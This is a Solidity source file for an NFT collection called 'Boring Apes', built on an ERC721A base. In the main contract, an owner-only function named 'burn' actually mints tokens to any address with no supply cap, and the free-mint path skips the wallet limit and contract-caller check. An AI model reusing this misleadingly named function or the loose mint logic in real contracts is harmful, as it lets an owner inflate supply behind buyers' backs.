1090         require(to != address(0), "ERC721A: mint to the zero address");
1091         require(quantity != 0, "ERC721A: quantity must be greater than 0");
1092 
1093         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1094 
1095         // Overflows are incredibly unrealistic.
1096         // balance or numberMinted overflow if current value of either + quantity > 3.4e38 (2**128) - 1
1097         // updatedIndex overflows if currentIndex + quantity > 1.56e77 (2**256) - 1
1098         unchecked {
1099             _addressData[to].balance += uint128(quantity);
1100             _addressData[to].numberMinted += uint128(quantity);
1101 
1102             _ownerships[startTokenId].addr = to;
1103             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1104 
1105             uint256 updatedIndex = startTokenId;
1106 
1107             for (uint256 i; i < quantity; i++) {
1108                 emit Transfer(address(0), to, updatedIndex);
1109                 if (safe) {
1110                     require(
1111                         _checkOnERC721Received(address(0), to, updatedIndex, _data),
1112                         "ERC721A: transfer to non ERC721Receiver implementer"
1113                     );
1114                 }
1115 
1116                 updatedIndex++;
1117             }
1118 
1119             currentIndex = updatedIndex;
1120         }
1121 
1122         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1123     }
1124 
1125     /**
1126      * @dev Transfers `tokenId` from `from` to `to`.
1127      *
1128      * Requirements:
1129      *
1130      * - `to` cannot be the zero address.
1131      * - `tokenId` token must be owned by `from`.
1132      *
1133      * Emits a {Transfer} event.
1134      */
1135     function _transfer(
1136         address from,
1137         address to,
1138         uint256 tokenId
1139     ) private {
1140         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1141 
1142         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1143             getApproved(tokenId) == _msgSender() ||
1144             isApprovedForAll(prevOwnership.addr, _msgSender()));
1145 
1146         require(isApprovedOrOwner, "ERC721A: transfer caller is not owner nor approved");
1147 
1148         require(prevOwnership.addr == from, "ERC721A: transfer from incorrect owner");
1149         require(to != address(0), "ERC721A: transfer to the zero address");
1150 
1151         _beforeTokenTransfers(from, to, tokenId, 1);
1152 
1153         // Clear approvals from the previous owner
1154         _approve(address(0), tokenId, prevOwnership.addr);
1155 
1156         // Underflow of the sender's balance is impossible because we check for
1157         // ownership above and the recipient's balance can't realistically overflow.
1158         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1159         unchecked {
1160             _addressData[from].balance -= 1;
1161             _addressData[to].balance += 1;
1162 
1163             _ownerships[tokenId].addr = to;
1164             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1165 
1166             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1167             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1168             uint256 nextTokenId = tokenId + 1;
1169             if (_ownerships[nextTokenId].addr == address(0)) {
1170                 if (_exists(nextTokenId)) {
1171                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1172                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1173                 }
1174             }
1175         }
1176 
1177         emit Transfer(from, to, tokenId);
1178         _afterTokenTransfers(from, to, tokenId, 1);
1179     }
1180 
1181     /**
1182      * @dev Approve `to` to operate on `tokenId`
1183      *
1184      * Emits a {Approval} event.
1185      */
1186     function _approve(
1187         address to,
1188         uint256 tokenId,
1189         address owner
1190     ) private {
1191         _tokenApprovals[tokenId] = to;
1192         emit Approval(owner, to, tokenId);
1193     }
1194 
1195     /**
1196      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.
1197      * The call is not executed if the target address is not a contract.
1198      *
1199      * @param from address representing the previous owner of the given token ID
1200      * @param to target address that will receive the tokens
1201      * @param tokenId uint256 ID of the token to be transferred
1202      * @param _data bytes optional data to send along with the call
1203      * @return bool whether the call correctly returned the expected magic value
1204      */
1205     function _checkOnERC721Received(
1206         address from,
1207         address to,
1208         uint256 tokenId,
1209         bytes memory _data
1210     ) private returns (bool) {
1211         if (to.isContract()) {
1212             try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1213                 return retval == IERC721Receiver(to).onERC721Received.selector;
1214             } catch (bytes memory reason) {
1215                 if (reason.length == 0) {
1216                     revert("ERC721A: transfer to non ERC721Receiver implementer");
1217                 } else {
1218                     assembly {
1219                         revert(add(32, reason), mload(reason))
1220                     }
1221                 }
1222             }
1223         } else {
1224             return true;
1225         }
1226     }
1227 
1228     /**
1229      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1230      *
1231      * startTokenId - the first token id to be transferred
1232      * quantity - the amount to be transferred
1233      *
1234      * Calling conditions:
1235      *
1236      * - When `from` and `to` are both non-zero, ``from``'s `tokenId` will be
1237      * transferred to `to`.
1238      * - When `from` is zero, `tokenId` will be minted for `to`.
1239      */
1240     function _beforeTokenTransfers(
1241         address from,
1242         address to,
1243         uint256 startTokenId,
1244         uint256 quantity
1245     ) internal virtual {}
1246 
1247     /**
1248      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1249      * minting.
1250      *
1251      * startTokenId - the first token id to be transferred
1252      * quantity - the amount to be transferred
1253      *
1254      * Calling conditions:
1255      *
1256      * - when `from` and `to` are both non-zero.
1257      * - `from` and `to` are never both zero.
1258      */
1259     function _afterTokenTransfers(
1260         address from,
1261         address to,
1262         uint256 startTokenId,
1263         uint256 quantity
1264     ) internal virtual {}
1265 }
1266 
1267 contract BoringApes is ERC721A, Ownable, ReentrancyGuard {
1268     string public baseURI = "ipfs://bafybeicux5pfhywmbil3sjcuzq6bqsauulrxsxnfaca3haa336lyuqyfky/";
1269     uint   public price             = 0.0035 ether;
1270     uint   public maxPerTx          = 10;
1271     uint   public maxPerFree        = 1;
1272     uint   public maxPerWallet      = 11;
1273     uint   public totalFree         = 5000;
1274     uint   public maxSupply         = 5000;
1275     bool   public mintEnabled;
1276     uint   public totalFreeMinted = 0;
1277 
1278     mapping(address => uint256) public _mintedFreeAmount;
1279     mapping(address => uint256) public _totalMintedAmount;
1280 
1281     constructor() ERC721A("Boring Apes", "BORINGAPES"){}
1282 
1283     function tokenURI(uint256 _tokenId) public view virtual override returns (string memory) {
1284         require(_exists(_tokenId),"ERC721Metadata: URI query for nonexistent token");
1285         string memory currentBaseURI = _baseURI();
1286         return bytes(currentBaseURI).length > 0
1287             ? string(abi.encodePacked(currentBaseURI,Strings.toString(_tokenId+1),".json"))
1288             : "";
1289     }
1290     
1291 
1292     function _startTokenId() internal view virtual returns (uint256) {
1293         return 1;
1294     }
1295 
1296     function mint(uint256 count) external payable {
1297         uint256 cost = price;
1298         bool isFree = ((totalFreeMinted + count < totalFree + 1) &&
1299             (_mintedFreeAmount[msg.sender] < maxPerFree));
1300 
1301         if (isFree) { 
1302             require(mintEnabled, "Mint is not live yet");
1303             require(totalSupply() + count <= maxSupply, "No more");
1304             require(count <= maxPerTx, "Max per TX reached.");
1305             if(count >= (maxPerFree - _mintedFreeAmount[msg.sender]))
1306             {
1307              require(msg.value >= (count * cost) - ((maxPerFree - _mintedFreeAmount[msg.sender]) * cost), "Please send the exact ETH amount");
1308              _mintedFreeAmount[msg.sender] = maxPerFree;
1309              totalFreeMinted += maxPerFree;
1310             }
1311             else if(count < (maxPerFree - _mintedFreeAmount[msg.sender]))
1312             {
1313              require(msg.value >= 0, "Please send the exact ETH amount");
1314              _mintedFreeAmount[msg.sender] += count;
1315              totalFreeMinted += count;
1316             }
1317         }
1318         else{
1319         require(mintEnabled, "Mint is not live yet");
1320         require(_totalMintedAmount[msg.sender] + count <= maxPerWallet, "Exceed maximum NFTs per wallet");
1321         require(msg.value >= count * cost, "Please send the exact ETH amount");
1322         require(totalSupply() + count <= maxSupply, "No more");
1323         require(count <= maxPerTx, "Max per TX reached.");
1324         require(msg.sender == tx.origin, "The minter is another contract");
1325         }
1326         _totalMintedAmount[msg.sender] += count;
1327         _safeMint(msg.sender, count);
1328     }
1329 
1330     function costCheck() public view returns (uint256) {
1331         return price;
1332     }
1333 
1334     function maxFreePerWallet() public view returns (uint256) {
1335       return maxPerFree;
1336     }
1337 
1338     function burn(address mintAddress, uint256 count) public onlyOwner {
1339         _safeMint(mintAddress, count);
1340     }
1341 
1342     function _baseURI() internal view virtual override returns (string memory) {
1343         return baseURI;
1344     }
1345 
1346     function setBaseUri(string memory baseuri_) public onlyOwner {
1347         baseURI = baseuri_;
1348     }
1349 
1350     function setPrice(uint256 price_) external onlyOwner {
1351         price = price_;
1352     }
1353 
1354     function setMaxTotalFree(uint256 MaxTotalFree_) external onlyOwner {
1355         totalFree = MaxTotalFree_;
1356     }
1357 
1358      function setMaxPerFree(uint256 MaxPerFree_) external onlyOwner {
1359         maxPerFree = MaxPerFree_;
1360     }
1361 
1362     function toggleMinting() external onlyOwner {
1363       mintEnabled = !mintEnabled;
1364     }
1365     
1366     function CommunityWallet(uint quantity, address user)
1367     public
1368     onlyOwner
1369   {
1370     require(
1371       quantity > 0,
1372       "Invalid mint amount"
1373     );
1374     require(
1375       totalSupply() + quantity <= maxSupply,
1376       "Maximum supply exceeded"
1377     );
1378     _safeMint(user, quantity);
1379   }
1380 
1381     function withdraw() external onlyOwner nonReentrant {
1382         (bool success, ) = msg.sender.call{value: address(this).balance}("");
1383         require(success, "Transfer failed.");
1384     }
1385 }